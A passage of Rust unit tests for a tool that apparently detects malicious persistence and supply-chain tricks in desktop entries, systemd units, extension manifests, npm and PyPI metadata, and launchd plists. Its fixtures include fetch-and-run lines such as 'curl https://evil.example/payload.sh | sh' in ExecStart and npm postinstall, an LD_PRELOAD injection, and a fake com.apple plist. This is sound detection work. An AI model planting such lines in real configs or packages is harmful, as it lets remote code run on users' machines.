        assert!(exec_str.contains("chmod +x"));

        // Autostart signal
        let autostart = navigate(
            &parsed,
            &parse_path("desktop_entry.x_gnome_autostart_enabled").unwrap(),
        );
        assert_eq!(autostart, vec![&json!("true")]);

        // Privilege-hint signal
        let kde_user = navigate(
            &parsed,
            &parse_path("desktop_entry.x_kde_username").unwrap(),
        );
        assert_eq!(kde_user, vec![&json!("root")]);

        // Icon/type mismatch hint
        let icon = navigate(&parsed, &parse_path("desktop_entry.icon").unwrap());
        assert_eq!(icon, vec![&json!("application-pdf")]);
    }

    #[test]
    fn test_parse_desktop_entry_skips_localized_keys() {
        let content = br#"[Desktop Entry]
Name=Editor
Name[cs]=Editor CS
Name[de]=Editor DE
Exec=editor %F
"#;
        let parsed = parse_desktop_entry(content).expect("desktop entry should parse");

        // Base Name= is kept; localized variants are dropped.
        let name = navigate(&parsed, &parse_path("desktop_entry.name").unwrap());
        assert_eq!(name, vec![&json!("Editor")]);
    }

    #[test]
    fn test_parse_desktop_entry_list_escapes() {
        // `\;` in a list value is a literal semicolon, not a separator.
        let content = br#"[Desktop Entry]
Keywords=one;two\;still-two;three;
"#;
        let parsed = parse_desktop_entry(content).expect("desktop entry should parse");
        let kw = navigate(&parsed, &parse_path("desktop_entry.keywords").unwrap());
        assert_eq!(kw, vec![&json!(["one", "two;still-two", "three"])]);
    }

    #[test]
    fn test_detect_format_desktop_by_extension() {
        let path = Path::new("/etc/xdg/autostart/evil.desktop");
        let format = detect_format(path, b"[Desktop Entry]\nExec=foo\n");
        assert_eq!(format, StructuredFormat::DesktopEntry);
    }

    #[test]
    fn test_evaluate_kv_systemd_service_queries() {
        let service = br#"
[Unit]
After=network-online.target auditd.service

[Service]
Environment="LD_PRELOAD=/tmp/evil.so"
ExecStart=/bin/old
ExecStart=
ExecStart=/bin/bash -c \
  curl -fsSL https://evil.example/payload.sh | sh

[Install]
WantedBy=multi-user.target graphical.target
"#;
        let path = Path::new("evil.service");

        let exec_start = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.exec_start".to_string(),
            exact: None,
            substr: Some("evil.example/payload.sh".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&exec_start, service, path).is_some());

        let ld_preload = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.environment.LD_PRELOAD".to_string(),
            exact: Some("/tmp/evil.so".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&ld_preload, service, path).is_some());

        let wanted_by_member = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "install.wanted_by".to_string(),
            exact: Some("multi-user.target".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&wanted_by_member, service, path).is_some());

        let wanted_by_size = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "install.wanted_by".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: Some(true),
            length_min: Some(2),
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&wanted_by_size, service, path).is_some());

        let old_exec_start = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.exec_start".to_string(),
            exact: Some("/bin/old".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&old_exec_start, service, path).is_none());
    }

    #[test]
    fn test_evaluate_kv_systemd_service_drop_in() {
        let service = b"[Service]\nExecStart=/usr/bin/curl https://evil.example/dropin.sh | sh\n";
        let path = Path::new("/etc/systemd/system/ssh.service.d/override.conf");
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.exec_start".to_string(),
            exact: None,
            substr: Some("evil.example/dropin.sh".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, service, path).is_some());
    }

    #[test]
    fn test_evaluate_kv_systemd_service_file_type_override() {
        let service = b"[Service]\nExecStart=/bin/bash -c curl https://evil.example | sh\n";
        let path = Path::new("suspicious.txt");
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.exec_start".to_string(),
            exact: None,
            substr: Some("evil.example".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(
            evaluate_kv_test_with_file_type(&cond, service, path, FileType::SystemdService)
                .is_some()
        );
    }

    #[test]
    fn test_parse_systemd_service_environment_reset_and_raw_tracking() {
        let service = br#"
[Service]
Environment="LD_PRELOAD=/tmp/old.so" "URL=https://old.example/payload.sh"
Environment=
Environment="LD_PRELOAD=/tmp/new.so" PATH=/tmp/bin
ExecStart=/bin/old
ExecStart=
ExecStart=/bin/new
"#;

        let parsed = parse_systemd_service(service).expect("systemd service should parse");

        let ld_preload = navigate(
            &parsed,
            &parse_path("service.environment.LD_PRELOAD").unwrap(),
        );
        assert_eq!(ld_preload, vec![&json!("/tmp/new.so")]);

        let old_url = navigate(&parsed, &parse_path("service.environment.URL").unwrap());
        assert!(
            old_url.is_empty(),
            "Environment= reset should clear old keys"
        );

        let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
        assert_eq!(
            env_list,
            vec![&json!(["LD_PRELOAD=/tmp/new.so", "PATH=/tmp/bin"])]
        );

        let raw_env = navigate(&parsed, &parse_path("service._raw.environment").unwrap());
        assert_eq!(
            raw_env,
            vec![&json!("\"LD_PRELOAD=/tmp/new.so\" PATH=/tmp/bin")]
        );

        let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
        assert_eq!(exec_start, vec![&json!("/bin/new")]);

        let raw_exec_start = navigate(&parsed, &parse_path("service._raw.exec_start").unwrap());
        assert_eq!(raw_exec_start, vec![&json!("/bin/new")]);
    }

    #[test]
    fn test_parse_systemd_service_escaped_items_and_semicolon_comments() {
        let service = br#"
; leading comment
[Service]
ReadOnlyPaths=/opt/my\sdir "/srv/quoted path"
Environment='GREETING=hello world' PATH=/tmp/my\sbin
ExecStartPre=/bin/echo start \
; comment inside continued block
  done
"#;

        let parsed = parse_systemd_service(service).expect("systemd service should parse");

        let read_only_paths = navigate(&parsed, &parse_path("service.read_only_paths").unwrap());
        assert_eq!(
            read_only_paths,
            vec![&json!(["/opt/my dir", "/srv/quoted path"])]
        );

        let greeting = navigate(
            &parsed,
            &parse_path("service.environment.GREETING").unwrap(),
        );
        assert_eq!(greeting, vec![&json!("hello world")]);

        let path_value = navigate(&parsed, &parse_path("service.environment.PATH").unwrap());
        assert_eq!(path_value, vec![&json!("/tmp/my bin")]);

        let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
        assert_eq!(
            env_list,
            vec![&json!(["GREETING=hello world", "PATH=/tmp/my bin"])]
        );

        let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
        assert_eq!(exec_start_pre, vec![&json!("/bin/echo start done")]);
    }

    #[test]
    fn test_evaluate_kv_systemd_environment_list_and_raw_queries() {
        let service = br#"
[Service]
Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
"#;
        let path = Path::new("evil.service");

        let env_list_item = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.environment_list[*]".to_string(),
            exact: Some("LD_PRELOAD=/tmp/evil.so".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&env_list_item, service, path).is_some());

        let env_var = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service.environment.URL".to_string(),
            exact: Some("https://evil.example/payload.sh".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&env_var, service, path).is_some());

        let raw_env = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "service._raw.environment".to_string(),
            exact: None,
            substr: Some("URL=https://evil.example/payload.sh".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&raw_env, service, path).is_some());
    }

    // ==========================================================================
    // Integration Tests
    // ==========================================================================

    #[test]
    fn test_chrome_manifest_permissions() {
        let manifest = br#"{
            "manifest_version": 3,
            "name": "Test Extension",
            "permissions": ["storage", "debugger", "tabs"],
            "host_permissions": ["<all_urls>"]
        }"#;

        let path = Path::new("manifest.json");

        // Test exact match in array
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test non-matching exact
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "permissions".to_string(),
            exact: Some("cookies".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_none());

        // Test manifest_version
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "manifest_version".to_string(),
            exact: Some("3".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_chrome_manifest_content_scripts() {
        let manifest = br#"{
            "content_scripts": [
                {
                    "matches": ["<all_urls>"],
                    "js": ["content.js"],
                    "run_at": "document_start"
                },
                {
                    "matches": ["*://*.amazon.com/*"],
                    "js": ["shopping.js"]
                }
            ]
        }"#;

        let path = Path::new("manifest.json");

        // Test wildcard path with exact match
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "content_scripts[*].matches".to_string(),
            exact: Some("<all_urls>".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test wildcard path with substr
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "content_scripts[*].matches".to_string(),
            exact: None,
            substr: Some("amazon".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());

        // Test run_at
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "content_scripts[*].run_at".to_string(),
            exact: Some("document_start".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, manifest, path).is_some());
    }

    #[test]
    fn test_npm_package_json() {
        let package = br#"{
            "name": "malicious-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload.sh | sh",
                "test": "jest"
            },
            "dependencies": {
                "lodash": "^4.17.21"
            }
        }"#;

        let path = Path::new("package.json");

        // Test existence check
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test substr
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: Some("curl".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test regex
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "scripts.postinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, package, path).is_some());

        // Test non-existent key
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "scripts.preinstall".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, package, path).is_none());
    }

    #[test]
    fn test_yaml_format() {
        let yaml = b"permissions:
  - storage
  - debugger
  - tabs
name: test
";

        let path = Path::new(".github/workflows/ci.yml");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "permissions".to_string(),
            exact: Some("debugger".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, yaml, path).is_some());
    }

    #[test]
    fn test_toml_format() {
        let toml = br#"
[package]
name = "my-crate"
version = "0.1.0"

[dependencies]
serde = "1.0"
openssl = "0.10"
"#;

        let path = Path::new("Cargo.toml");

        // Test existence
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "dependencies.openssl".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, toml, path).is_some());

        // Test non-existent
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "dependencies.tokio".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, toml, path).is_none());

        // Test exact value
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "package.name".to_string(),
            exact: Some("my-crate".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, toml, path).is_some());
    }

    // ==========================================================================
    // Edge Case Tests
    // ==========================================================================

    #[test]
    fn test_empty_array() {
        let json = br#"{"permissions": []}"#;
        let path = Path::new("package.json");

        // Empty array exists
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "permissions".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_some());

        // But contains nothing
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "permissions".to_string(),
            exact: Some("anything".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_none());
    }

    #[test]
    fn test_null_value() {
        let json = br#"{"value": null}"#;
        let path = Path::new("package.json");

        // Path exists
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "value".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_some());

        // exact: "null" matches
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "value".to_string(),
            exact: Some("null".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_deeply_nested() {
        let json = br#"{"a": {"b": {"c": {"d": {"e": "found"}}}}}"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "a.b.c.d.e".to_string(),
            exact: Some("found".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_unicode() {
        let json = r#"{"name": "日本語パッケージ"}"#.as_bytes();
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "name".to_string(),
            exact: None,
            substr: Some("日本語".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, json, path).is_some());
    }

    #[test]
    fn test_malformed_json() {
        let bad = br#"{"broken": }"#;
        let path = Path::new("package.json");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "broken".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        // Should not panic, just return no match
        assert!(evaluate_kv_test(&cond, bad, path).is_none());
    }

    // ==========================================================================
    // PKG-INFO Format Tests
    // ==========================================================================

    #[test]
    fn test_detect_pkginfo_by_filename() {
        assert_eq!(
            detect_format(Path::new("PKG-INFO"), b""),
            StructuredFormat::PkgInfo
        );
        assert_eq!(
            detect_format(Path::new("METADATA"), b""),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_detect_pkginfo_by_content() {
        let content = b"Metadata-Version: 2.1\nName: my-package\n";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::PkgInfo
        );
    }

    #[test]
    fn test_pkginfo_simple() {
        let pkginfo = b"Metadata-Version: 2.1
Name: malicious-package
Version: 1.0.0
Summary: A suspicious package
Author: attacker@evil.com
";

        let path = Path::new("PKG-INFO");

        // Test name match
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "name".to_string(),
            exact: Some("malicious-package".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test version
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "version".to_string(),
            exact: Some("1.0.0".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test author contains suspicious domain
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "author".to_string(),
            exact: None,
            substr: Some("evil.com".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test existence
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "summary".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Test non-existent
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "license".to_string(),
            exact: None,
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_none());
    }

    #[test]
    fn test_pkginfo_multiple_classifiers() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Classifier: Development Status :: 3 - Alpha
Classifier: License :: OSI Approved :: MIT License
Classifier: Programming Language :: Python :: 3
";

        let path = Path::new("PKG-INFO");

        // Multiple Classifier values become an array
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "classifier".to_string(),
            exact: None,
            substr: Some("MIT License".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());

        // Check Python classifier
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "classifier".to_string(),
            exact: None,
            substr: Some("Python".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_multiline_description() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Description: This is a package
        with a multi-line
        description.
Version: 1.0.0
";

        let path = Path::new("PKG-INFO");

        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "description".to_string(),
            exact: None,
            substr: Some("multi-line".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    #[test]
    fn test_pkginfo_case_insensitive_keys() {
        let pkginfo = b"Metadata-Version: 2.1
Name: my-package
Author-Email: test@example.com
";

        let path = Path::new("PKG-INFO");

        // Keys are normalized to lowercase
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "author-email".to_string(),
            exact: None,
            substr: Some("example.com".to_string()),
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
    }

    // ==========================================================================
    // Plist Format Tests
    // ==========================================================================

    #[test]
    fn test_detect_plist_by_extension() {
        assert_eq!(
            detect_format(Path::new("Info.plist"), b""),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_xml_plist_by_content() {
        let content = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>test</string>\n</dict>\n</plist>";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_detect_binary_plist_by_content() {
        let content = b"bplist00\xd1\x01\x02STest\x08\x0b\x10\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x15";
        assert_eq!(
            detect_format(Path::new("unknown"), content),
            StructuredFormat::Plist
        );
    }

    #[test]
    fn test_xml_plist_evaluation() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.example.app</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.15</string>
    <key>Permissions</key>
    <array>
        <string>camera</string>
        <string>microphone</string>
    </array>
</dict>
</plist>";

        let path = Path::new("Info.plist");

        // Test exact match
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.example.app".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, plist, path).is_some());

        // Test match in array
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "Permissions".to_string(),
            exact: Some("camera".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, plist, path).is_some());

        // Test non-matching
        let cond = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "CFBundleIdentifier".to_string(),
            exact: Some("com.other.app".to_string()),
            substr: None,
            regex: None,
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond, plist, path).is_none());
    }

    #[test]
    fn test_plist_masquerading_detection() {
        let plist = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>Program</key>
    <string>/tmp/.hidden_updater</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>";

        let path = Path::new("com.apple.systemupdate.plist");

        // Test Label starts with com.apple.
        let cond_label = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "Label".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^com\.apple\.".to_string()),
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond_label, plist, path).is_some());

        // Test Program is in /tmp/
        let cond_program = Condition::Kv(KvQuery {
            match_mode: Default::default(),
            path: "Program".to_string(),
            exact: None,
            substr: None,
            regex: Some(r"^/tmp/".to_string()),
            eq: None,
            ne: None,
            case_insensitive: false,
            exists: None,
            length_min: None,
            length_max: None,
            is_check: None,
            not: None,
        });
        assert!(evaluate_kv_test(&cond_program, plist, path).is_some());
    }

    #[test]
    fn test_format_evidence_multibyte_truncation() {
        // Create a string where byte position 197 falls inside a multi-byte CJK char.
        // Each CJK character is 3 bytes in UTF-8.
        // 65 CJK chars = 195 bytes, then 1 more = 198 bytes, crossing the 197 boundary.
        let cjk: String = "漢".repeat(70); // 210 bytes
        assert!(cjk.len() > 200);

        let value = json!(cjk);
        // This should not panic — previously it would slice mid-character
        let result = format_evidence_value_with_size(&value, None, None);
        assert!(result.ends_with("..."));
        // Verify the truncated string is valid UTF-8
        assert!(result.is_char_boundary(0));
    }

    // ============================================================
    // Cross-fact eq/ne tests
    // ============================================================

    #[test]
    fn sibling_lookup_prefers_the_shallowest_match() {
        // A package that vendors its dependencies holds several README.md; the
        // one that speaks for the archive is the one nearest the root.
        let mk = |path: &str, heading: &str| {
            let mut f = FileAnalysis::new(0, path.into(), "markdown".into(), String::new(), 0);
            crate::types::core::flatten_kv_for_output(
                &json!({"markdown": {"first_heading": heading}}),
                &mut f.kv,
            );
            f
        };
        let mut report = AnalysisReport::new(TargetInfo::default());
        // Nested entry deliberately first, as tar order often puts it.
        report.files = vec![
            mk("package/node_modules/debug/README.md", "debug"),
            mk("package/README.md", "finalhandler"),
        ];
        let report: &'static AnalysisReport = Box::leak(Box::new(report));
        let ctx = EvaluationContext::test_only_new(report, &[], FileType::All);
        let got = resolve_all_values("README.md::markdown.first_heading", &ctx);
        assert_eq!(got, vec![serde_json::json!("finalhandler")]);
    }

    #[test]
    fn sibling_array_fact_resolves_every_element() {
        // `flatten_kv_for_output` writes an array as indexed keys, so the
        // sibling lookup must return the elements rather than nothing.
        let mut kv = std::collections::BTreeMap::new();
        kv.insert(
            "markdown.npm_packages[0]".to_string(),
            serde_json::json!("chain-registry"),
        );
        kv.insert(
            "markdown.npm_packages[1]".to_string(),
            serde_json::json!("@chain-registry/utils"),
        );
        kv.insert(
            "markdown.first_heading".to_string(),
            serde_json::json!("theta-registry"),
        );
        let got = crate::types::core::kv_lookup_flattened(&kv, "markdown.npm_packages");
        assert_eq!(
            got,
            vec![
                &serde_json::json!("chain-registry"),
                &serde_json::json!("@chain-registry/utils")
            ]
        );
        // Scalars still resolve through the same accessor.
        assert_eq!(
            crate::types::core::kv_lookup_flattened(&kv, "markdown.first_heading"),
            vec![&serde_json::json!("theta-registry")]
        );
        // An absent path yields nothing.
        assert!(crate::types::core::kv_lookup_flattened(&kv, "markdown.absent").is_empty());
    }

    #[test]
    fn sibling_array_lookup_excludes_nested_element_leaves() {
        // `a.b[0].c` is a leaf inside an element, not an element of `a.b`.
        let mut kv = std::collections::BTreeMap::new();
        kv.insert("a.b[0].c".to_string(), serde_json::json!("nested"));
        kv.insert("a.bx".to_string(), serde_json::json!("adjacent-prefix"));
        assert!(crate::types::core::kv_lookup_flattened(&kv, "a.b").is_empty());
    }

    #[test]
    fn split_qualified_path_no_prefix() {
        assert_eq!(split_qualified_path("foo.bar"), (None, "foo.bar"));
    }

    #[test]
    fn split_qualified_path_with_filename() {
        assert_eq!(
            split_qualified_path("README.md::markdown.first_heading"),
